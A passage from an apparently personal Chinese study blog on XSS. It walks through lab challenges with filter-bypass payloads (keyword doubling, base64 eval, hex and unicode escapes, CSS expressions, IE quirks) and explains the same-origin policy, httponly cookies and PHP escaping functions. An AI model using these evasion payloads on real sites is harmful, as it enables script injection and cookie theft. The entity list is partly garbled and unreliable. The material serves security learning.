<p>按照之前的办法使用<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>查看返会结果，可以看到吧domain给替换成了空</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193837927.png" alt="image-20200413193837927"></p>
<h5 id="2、绕过思考"><a href="#2、绕过思考" class="headerlink" title="2、绕过思考"></a>2、绕过思考</h5><p>寻找过滤内容，这里过滤的就是domain</p>
<p>绕过策略</p>
<ul>
<li>双写绕过</li>
<li>编码绕过</li>
</ul>
<h5 id="3、双写绕过"><a href="#3、双写绕过" class="headerlink" title="3、双写绕过"></a>3、双写绕过</h5><p>Payload：<code>&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</code></p>
<p>复制Payload进行提交，页面成功弹窗。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194654678.png" alt="image-20200413194654678"></p>
<p>返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194724423.png" alt="image-20200413194724423"></p>
<h5 id="4、编码绕过"><a href="#4、编码绕过" class="headerlink" title="4、编码绕过"></a>4、编码绕过</h5><p>eval函数是javascript当中经常用来执行字符串，这个字符串就会当做程序进行执行</p>
<p>atob函数是将加密的base64编码进行解码，转换成原来的字符</p>
<p>Payload：<code>&quot;&gt;&lt;script&gt;eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;));&lt;/script&gt;</code></p>
<p>这里进行加密的内容只有<code>alert(document.domain)</code></p>
<p>进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195311101.png" alt="image-20200413195311101"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195353237.png" alt="image-20200413195353237"></p>
<p>查看页面返回信息</p>
<p>页面成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195418479.png" alt="image-20200413195418479"></p>
<h4 id="绕过替换scrip和on事件的XSS"><a href="#绕过替换scrip和on事件的XSS" class="headerlink" title="绕过替换scrip和on事件的XSS"></a>绕过替换scrip和on事件的XSS</h4><h5 id="1、XSS漏洞发现-1"><a href="#1、XSS漏洞发现-1" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串，随便打</p>
<p>在响应中查找输入的内容，发现了输入的字符串，由此就可能有XSS漏洞，是否存在需要我们具体探测。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414084954106.png" alt="image-20200414084954106"></p>
<h5 id="2、饶过思考"><a href="#2、饶过思考" class="headerlink" title="2、饶过思考"></a>2、饶过思考</h5><p>1、寻找过滤内容</p>
<p>文本框输入的onclick已经被过滤了onxxx，所以没有触发xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414085844194.png" alt="image-20200414085844194"></p>
<p>on事件被过滤后，我们尝试一下使用闭合inptu，使用script</p>
<p>可以看到script变成了xscript这样就导致页面无法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414090353664.png" alt="image-20200414090353664"></p>
<h5 id="3、伪协议绕过"><a href="#3、伪协议绕过" class="headerlink" title="3、伪协议绕过"></a>3、伪协议绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;/a&gt;</code></p>
<p>发现javascript中的script变成了xscript，这样也没有办法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414093328336.png" alt="image-20200414093328336"></p>
<h5 id="4、空格绕过"><a href="#4、空格绕过" class="headerlink" title="4、空格绕过"></a>4、空格绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascr      ipt:alert(document.domain);&quot;&gt;xss&lt;/a&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095059130.png" alt="image-20200414095059130"></p>
<p>单击后面的xss超链接，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095153281.png" alt="image-20200414095153281"></p>
<p>返回了<strong>Congratulations!!</strong>，成功通关</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095306986.png" alt="image-20200414095306986"></p>
<h4 id="利用IE特性绕过XSS过滤"><a href="#利用IE特性绕过XSS过滤" class="headerlink" title="利用IE特性绕过XSS过滤"></a>利用IE特性绕过XSS过滤</h4><h5 id="1、XSS漏洞发现-2"><a href="#1、XSS漏洞发现-2" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414140342524.png" alt="image-20200414140342524"></p>
<h5 id="2、基本XSS利用"><a href="#2、基本XSS利用" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>HTML事件触发XSS</p>
<p>发现onclick在双引号当中，需要进行闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152038909.png" alt="image-20200414152038909"></p>
<p>发现输入的双引号并没有被闭合，而是双引号和去掉双引号后的空格被去掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152200102.png" alt="image-20200414152200102"></p>
<p>测试之后使用script也被过滤了</p>
<h5 id="3、IE特性"><a href="#3、IE特性" class="headerlink" title="3、IE特性"></a>3、IE特性</h5><p>IE中两个反引号``可以闭合一个左边双引号</p>
<h5 id="4、Palyoad触发XSS"><a href="#4、Palyoad触发XSS" class="headerlink" title="4、Palyoad触发XSS"></a>4、Palyoad触发XSS</h5><p>Payload=``onclick=alert(document.domain)</p>
<p>编辑一个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414162753350.png" alt="image-20200414162753350"></p>
<p>发现使用``成功将双引号闭合，执行了onclick</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163018581.png" alt="image-20200414163018581"></p>
<p>点击输入框，弹出弹框说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163213485.png" alt="image-20200414163213485"></p>
<p>成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163234488.png" alt="image-20200414163234488"></p>
<h4 id="利用CSS特性触发XSS过滤"><a href="#利用CSS特性触发XSS过滤" class="headerlink" title="利用CSS特性触发XSS过滤"></a>利用CSS特性触发XSS过滤</h4><p>CSS层叠样式表</p>
<h5 id="1、XSS漏洞发现-3"><a href="#1、XSS漏洞发现-3" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，在响应中查找</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165148387.png" alt="image-20200414165148387"></p>
<h5 id="2、基本XSS利用-1"><a href="#2、基本XSS利用-1" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>因为是在属性中出现的字符串所以可以用事件触发XSS</p>
<p>利用HTML时间触发XSS</p>
<p>并没有当成Payload输出，而是当成字符串输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165445847.png" alt="image-20200414165445847"></p>
<p>使用script发现也是当做字符串输出，我们看一发现引号颜色不一样，这样可以确定被进行了转义</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165702242.png" alt="image-20200414165702242"></p>
<h5 id="3、CSS特性讲解"><a href="#3、CSS特性讲解" class="headerlink" title="3、CSS特性讲解"></a>3、CSS特性讲解</h5><p>background是设置背景颜色</p>
<p>指定一个url表名要加载一张图片</p>
<p>在加载图路径当中输入javascript伪协议执行JS。目前只有IE浏览器支持，其他浏览器已经不支持了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background.url(&quot;javascript:alert(document.domain);&quot;);	设置背景颜色</span><br></pre></td></tr></table></figure>

<h5 id="4、Payload触发XSS"><a href="#4、Payload触发XSS" class="headerlink" title="4、Payload触发XSS"></a>4、Payload触发XSS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:#f00;background.url(&quot;javascript:alert(document.domain);&quot;);  设置背景颜色</span><br></pre></td></tr></table></figure>

<p>IE11.0之后就不会执行该xss了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210507320.png" alt="image-20200414210507320"></p>
<p>点击YES放行，成功弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210533918.png" alt="image-20200414210533918"></p>
<h4 id="IE中利用CSS触发XSS"><a href="#IE中利用CSS触发XSS" class="headerlink" title="IE中利用CSS触发XSS"></a>IE中利用CSS触发XSS</h4><h5 id="1、CSS介绍"><a href="#1、CSS介绍" class="headerlink" title="1、CSS介绍"></a>1、CSS介绍</h5><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p>
<h5 id="2、CSS中执行JS"><a href="#2、CSS中执行JS" class="headerlink" title="2、CSS中执行JS"></a>2、CSS中执行JS</h5><p>css expression(css表达式)又称Dynamic properties(动态属性)是早期微软DHTML的产物，以其可以在Css中定义表达式(公式)来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题，微软从IE8 beta2标准模式开始，取消对css expression的支持。</p>
<p>实际应用</p>
<p>　　早期很多开发人员利用css expression实现了许多效果，比如将元素相对鼠标指针进行定位，根据一个定时器来移动元素等等。当然这些效果能够使用js来实现。</p>
<p>　　虽然css表达式问题很多，但是我们依然能够在网上看到它们的影子，甚至在一些成熟的商业网站上。最常见的一个应用就是悬浮在页面上的某个模块(比如导航、返回顶部)。</p>
<h5 id="3、注释绕过关键字过滤"><a href="#3、注释绕过关键字过滤" class="headerlink" title="3、注释绕过关键字过滤"></a>3、注释绕过关键字过滤</h5><p>CSS中的注释符/**/</p>
<p>绕过对关键字expression的过滤。ex/**/pression</p>
<h5 id="4、触发XSS"><a href="#4、触发XSS" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>xss:                            随便的属性爱设置啥设置啥</p>
<p>expres/**/sion        进行注释绕过</p>
<p>window.x                  window获取全局窗口，x是没有定义这个x变量，这样会报错执行alert代码</p>
<p>Payload：xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1})</p>
<p>复制进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100911703.png" alt="image-20200415100911703"></p>
<p>返回弹框，点击确定，返回Congratulations！！<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100943454.png" alt="image-20200415100943454"></p>
<h4 id="16进制绕过过滤触发XSS"><a href="#16进制绕过过滤触发XSS" class="headerlink" title="16进制绕过过滤触发XSS"></a>16进制绕过过滤触发XSS</h4><h5 id="1、16进制介绍"><a href="#1、16进制介绍" class="headerlink" title="1、16进制介绍"></a>1、16进制介绍</h5><p>十六进制转换有16进制每一位上可以是从小到大为：0-9、A-F。16个大小不同的数，即16进1，其中A-F（字母不区分大小写）这六个字母来分别表示10-15</p>
<p>使用python将字符串转换为16进制类型</p>
<p><code>\\x</code>将它输出为JS可以识别的16进制的写法</p>
<p><code>print(&quot;\\x&quot;+binascii.b2a_hex(s)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415134518536.png" alt="image-20200415134518536"></p>
<h5 id="2、XSS挖掘"><a href="#2、XSS挖掘" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>自己构造一个字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135051423.png" alt="image-20200415135051423"></p>
<h5 id="3、双斜杠-16进制绕过"><a href="#3、双斜杠-16进制绕过" class="headerlink" title="3、双斜杠+16进制绕过"></a>3、双斜杠+16进制绕过</h5><p>使用引号闭合等都不能将其闭合，还是当成字符串输出，可以看到，双引号颜色就不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135306740.png" alt="image-20200415135306740"></p>
<p>将尖括号进行转义，输入，这里不能使用单斜杠也就是<code>\x3c</code>会被转义，要是用双斜杠<code>\\x3c</code>这样才能正常输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135813336.png" alt="image-20200415135813336"></p>
<h5 id="4、触发XSS-1"><a href="#4、触发XSS-1" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p>
<p>输入Payload，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140124310.png" alt="image-20200415140124310"></p>
<p>并且返回了Congratulations!! </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140140261.png" alt="image-20200415140140261"></p>
<h4 id="unicode绕过过滤触发XSS"><a href="#unicode绕过过滤触发XSS" class="headerlink" title="unicode绕过过滤触发XSS"></a>unicode绕过过滤触发XSS</h4><h5 id="1、unicode介绍"><a href="#1、unicode介绍" class="headerlink" title="1、unicode介绍"></a>1、unicode介绍</h5><p>Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</p>
<p>使用py将字符串转换为Unicode类型</p>
<p>加双斜杠，单斜杠会被转义\u00就是JS能识别的Unicode编码</p>
<p><code>print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&lt;&quot;)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175404676.png" alt="image-20200415175404676"></p>
<h5 id="2、XSS挖掘-1"><a href="#2、XSS挖掘-1" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>构造一个字符串</p>
<p>输入之后被没有将其转换为尖括号，这样就不能使用16进制绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175524635.png" alt="image-20200415175524635"></p>
<h5 id="3、双斜杠-unicode绕过"><a href="#3、双斜杠-unicode绕过" class="headerlink" title="3、双斜杠+unicode绕过"></a>3、双斜杠+unicode绕过</h5><p>成功转换为了尖括号</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175910063.png" alt="image-20200415175910063"></p>
<h5 id="4、触发XSS-2"><a href="#4、触发XSS-2" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code></p>
<p>复制Payload，输入提交成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415180212082.png" alt="image-20200415180212082"></p>
<h4 id="浏览器同源策略介绍"><a href="#浏览器同源策略介绍" class="headerlink" title="浏览器同源策略介绍"></a>浏览器同源策略介绍</h4><h5 id="1、源的含义"><a href="#1、源的含义" class="headerlink" title="1、源的含义"></a>1、源的含义</h5><p>源指源头，信息来源的位置。在计算机中源在RFC6454文档中规定，源是由协议，主机名，端口名组成。</p>
<p>范例：协议://主机名:端口号/</p>
<p>它们的协议不一样，所以不是同源</p>
<p>如：<a href="http://1.1.1.1:8080/" target="_blank" rel="noopener">http://1.1.1.1:8080/</a>    和    <a href="https://1.1.1.1:8080/" target="_blank" rel="noopener">https://1.1.1.1:8080/</a></p>
<h5 id="2、同源策略"><a href="#2、同源策略" class="headerlink" title="2、同源策略"></a>2、同源策略</h5><p>在计算机中，同源策略（Same origin policy，SOP）用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面。</p>
<p>例如：源A–&gt;源B，如果两个的源不相同是不能进行直接通信的</p>
<p>只有两个页面属于同一个源才能互相访问。不同的源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的JS脚本采用ajax读取b.com里面的文件数据是不会报错的 </p>
<p>例如：源A页面访问源B页面认证cookie，如果不加阻止读取cookie，会造成cookie欺骗绕过登录验证。</p>
<p>注意：同源一定要是协议、主机名、端口号完全一致</p>
<h5 id="3、IE源的特殊处理"><a href="#3、IE源的特殊处理" class="headerlink" title="3、IE源的特殊处理"></a>3、IE源的特殊处理</h5><p>1、位于可信域（Trust Zones）的互信的域名间，不受同源策略限制</p>
<p>2、IE在判断同源时不考虑端口。</p>
<p>可是通过document.domain读取或修改源。但是有限制，修改之后的源不能通过其他脚本再次修改。</p>
<h5 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h5><p>domain 属性可以解决因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如：</p>
<p>child.a.com和a.com，</p>
<p>child.a1.com和child2.a.com</p>
<p>xxx.child1.a.com和child1.a.com</p>
<p>两两不同源，但可以通过设置document.domain=’a.com’，浏览器就会认为他们都是用一个源。想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain=’a.com’。</p>
<h4 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h4><h5 id="1、cookie介绍"><a href="#1、cookie介绍" class="headerlink" title="1、cookie介绍"></a>1、cookie介绍</h5><p>指某些网站为了辨别用户身份，进行了session跟踪而存储在用户本地终端上的数据（通常经过加密）。</p>
<p>cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，他可以包含有关用户的信息。无论何时用户连接到服务器，web站点都可以访问cookie信息。</p>
<p>目前有些cookie是临时的，有些则是持续的。临时的cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间，该cookie就会被系统清除。 </p>
<h5 id="2、cookie作用"><a href="#2、cookie作用" class="headerlink" title="2、cookie作用"></a>2、cookie作用</h5><p>cookie是存储在客户端上的一段小数据，浏览器（及客户端）通过HTTP协议和服务器端进行cookie交互，通常用材存储一些不敏感信息。</p>
<p>有时候cookie用于身份认证，这时候cookie信息很敏感</p>
<p>演示dvwa，sql注入利用，sqlmap测试</p>
<p>直接测试的话会进行302跳转，这样就没办法获取</p>
<p> <img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101131762.png" alt="image-20200416101131762"></p>
<p>如果我们将登录后的cookie，加入的话，进行运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101232606.png" alt="image-20200416101232606"></p>
<p>成功返回数据库，这就是cookie身份验证时的作用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101257277.png" alt="image-20200416101257277"></p>
<h5 id="3、清除cookie"><a href="#3、清除cookie" class="headerlink" title="3、清除cookie"></a>3、清除cookie</h5><ul>
<li>通过浏览器工具清除cookie，打开Internet选项</li>
<li><img src="/2020/04/20/XSS/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200416101920286.png" alt="image-20200416101920286"></li>
<li>通过设置cookie的有效期来清除cookie；删除cookie可能会导致某些页面不能用。</li>
</ul>
<p>可以通过一些就是360，电脑管家等杀毒软件清除cookie</p>
<h5 id="4、cookie-httponly"><a href="#4、cookie-httponly" class="headerlink" title="4、cookie httponly"></a>4、cookie httponly</h5><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416105305914.png" alt="image-20200416105305914"></p>
<p>设置一个xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111001365.png" alt="image-20200416111001365"></p>
<p>设置为true不能返回cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416110923115.png" alt="image-20200416110923115"></p>
<p>设置为false，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111051812.png" alt="image-20200416111051812"></p>
<p>发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111119690.png" alt="image-20200416111119690"></p>
<h4 id="xss-filter过滤器介绍-防御"><a href="#xss-filter过滤器介绍-防御" class="headerlink" title="xss-filter过滤器介绍(防御)"></a>xss-filter过滤器介绍(防御)</h4><h5 id="1、htmlspecialchars-函数"><a href="#1、htmlspecialchars-函数" class="headerlink" title="1、htmlspecialchars()函数"></a>1、htmlspecialchars()函数</h5><p>htmlspecialchars()函数吧预定义的字符转换为HTML实体</p>
<p>预定义的字符是：</p>
<ul>
<li><code>&amp;</code>     (和号)         成为    <code>&amp;</code></li>
<li><code>&quot;</code>     (双引号)     成为    <code>&quot;</code></li>
<li><code>&#39;</code>     (单引号)     成为    <code>&#39;</code></li>
<li><code>&lt;</code>     (小于)         成为    <code>&lt;</code></li>
<li><code>&gt;</code>     (大于)         成为    <code>1</code></li>
</ul>
<p>htmlspecialchars(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a></p>
<p>编写一个简单的xss，使用htmlspecialchars()进行过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131647589.png" alt="image-20200416131647589"></p>
<p>在地址栏输入id值，返回了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131716069.png" alt="image-20200416131716069"></p>
<p>改进代码，将scrip代码当做字符串，也就是实体输出，不会当成代码输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132559662.png" alt="image-20200416132559662"></p>
<p>验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132700892.png" alt="image-20200416132700892"></p>
<h5 id="2、htmlentities-函数"><a href="#2、htmlentities-函数" class="headerlink" title="2、htmlentities()函数"></a>2、htmlentities()函数</h5><p>这个函数对于过滤用户输入的数据非常有用，他会将一些特殊字符转换为HTML实体。例如，用户输入&lt;时就会被该函数转换为HTML实体&lt;(&amp;lt)，输入&gt;就会被转换为实体&amp;gt</p>
<p>htmlentities(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlentities.asp</a></p>
<p>构造一个xss</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140523501.png" alt="image-20200416140523501"></p>
<p>在页面中输入，发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140656017.png" alt="image-20200416140656017"></p>
<p>进行过滤更改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140808003.png" alt="image-20200416140808003"></p>
<p>在页面运行，返回了scipt的字符串，如果不加过滤就会弹出document.domain的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140853720.png" alt="image-20200416140853720"></p>
<h5 id="3、strip-tags-函数"><a href="#3、strip-tags-函数" class="headerlink" title="3、strip_tags()函数"></a>3、strip_tags()函数</h5><p>strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签</p>
<p>注释：该函数始终会剥离HTML注释。这点无法通过allow参数改变</p>
<p>注释：该函数是二进制安全的</p>
<p>strip_tags(string,allow)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_strip_tags.asp</a></p>
<p>更改代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416141524570.png" alt="image-20200416141524570"></p>
<p>可以发现，他是直接删除了，JS的script标签，而不是进行了实体转换</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142010850.png" alt="image-20200416142010850"></p>
<h5 id="4、自定义xss-filter"><a href="#4、自定义xss-filter" class="headerlink" title="4、自定义xss filter"></a>4、自定义xss filter</h5><p>在网上有很多自定义的xss filter，进行自行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142307890.png" alt="image-20200416142307890"></p>
<p>加入该函数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142630506.png" alt="image-20200416142630506"></p>
<p>在页面中打开，去除了script标签</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142658469.png" alt="image-20200416142658469"></p>
<h4 id="编码转义介绍"><a href="#编码转义介绍" class="headerlink" title="编码转义介绍"></a>编码转义介绍</h4><h5 id="1、URL编码"><a href="#1、URL编码" class="headerlink" title="1、URL编码"></a>1、URL编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165118729.png" alt="image-20200416165118729"></p>
<p>百分号编码：url编码包含一个百分号（%），后面跟着两个标识字符的ascii码的十六进制数，例如：空格转换为”%20”。</p>
<h5 id="2、html编码"><a href="#2、html编码" class="headerlink" title="2、html编码"></a>2、html编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165359455.png" alt="image-20200416165359455"></p>
<p>实体编码：一般以”&amp;”开头，” ; “结尾，可以不加” ; “。如：“&lt;”转为“&lt;”</p>
<p>进制编码：以“&amp;#”开头，加上字符的数值，以” ; “结尾，可以不加“;”。字符的数值可以是任意十进制的ascii码，或unicode字符编码。十六进制的数值需要在编码数字前加“x”。如：“&lt;”转换为十进制的“&lt;”或十六进制的”&lt;”</p>
<h5 id="3、javascrip编码"><a href="#3、javascrip编码" class="headerlink" title="3、javascrip编码"></a>3、javascrip编码</h5><p>数字形式：\u后面加4位16进制数字（或\x后加2位16进制数字），按字符的uncode数据编码，不足位数以零填充，如：“&lt;”转为”\u003c”或者”\x3c”。其中”\u”开头的unicode转义方式可以在字符串之外的位置，其他的不可以</p>
<p>jsfuck：<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p>
<h5 id="4、编码含义"><a href="#4、编码含义" class="headerlink" title="4、编码含义"></a>4、编码含义</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416170820749.png" alt="image-20200416170820749"></p>
<h4 id="XSS过滤器绕过"><a href="#XSS过滤器绕过" class="headerlink" title="XSS过滤器绕过"></a>XSS过滤器绕过</h4><h5 id="1、本地环境搭建"><a href="#1、本地环境搭建" class="headerlink" title="1、本地环境搭建"></a>1、本地环境搭建</h5><p>在web程序中找到过滤的函数，然后拷贝到本地环境搭建完成</p>
<p>xss filter中的代码，加入了红框部分的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195054147.png" alt="image-20200416195054147"></p>
<p>在页面查看发现成功将script标签删除掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195258557.png" alt="image-20200416195258557"></p>
<h5 id="2、xss-payload测试"><a href="#2、xss-payload测试" class="headerlink" title="2、xss payload测试"></a>2、xss payload测试</h5><p>kali linux下自带字典，在CTF比赛中经常使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195713132.png" alt="image-20200416195713132"></p>
<p>这里肯定使用的是XSS.txt。</p>
<h5 id="3、自动化工具测试"><a href="#3、自动化工具测试" class="headerlink" title="3、自动化工具测试"></a>3、自动化工具测试</h5><p>可以使用burpsuite进行自动化探测，将字典放进去让其自己执行筛选</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416200741297.png" alt="image-20200416200741297"></p>
<h5 id="4、关注最新HTML内容"><a href="#4、关注最新HTML内容" class="headerlink" title="4、关注最新HTML内容"></a>4、关注最新HTML内容</h5><p>在进行XSS过程中一定要关注最新的HTML，尤其是新加入的标签，可能会被过滤导致XSS触发</p>
<p>例如HTML5中新标签</p>
<p><code>&lt;video src=1 onerror=alert(1)&gt;</code></p>
<p><code>&lt;audio src=1 onerror=alert(1)&gt;</code></p>
<p>参考：<a href="https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
<h4 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h4><h5 id="1、GET型URL中的XSS"><a href="#1、GET型URL中的XSS" class="headerlink" title="1、GET型URL中的XSS"></a>1、GET型URL中的XSS</h5><p>如果在URL中提交参数值，在页面中显示。很有可能存在XSS</p>
<p>这种就可以在输入框中直接输入xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203528298.png" alt="image-20200416203528298"></p>
<h5 id="2、POST型表单中的XSS"><a href="#2、POST型表单中的XSS" class="headerlink" title="2、POST型表单中的XSS"></a>2、POST型表单中的XSS</h5><p>如果在表单中提交的参数值，在页面中显示。很有可能存在XSS</p>
<p>表单提交在页面显示结果，但在URL没有显示结果在响应中是Form Data表示表单数据，这时候他一定是一个POST提交参数</p>
<p>还是直接在输入框直接输入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203725722.png" alt="image-20200416203725722"></p>
<h5 id="3、JSON中的XSS"><a href="#3、JSON中的XSS" class="headerlink" title="3、JSON中的XSS"></a>3、JSON中的XSS</h5><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率</p>
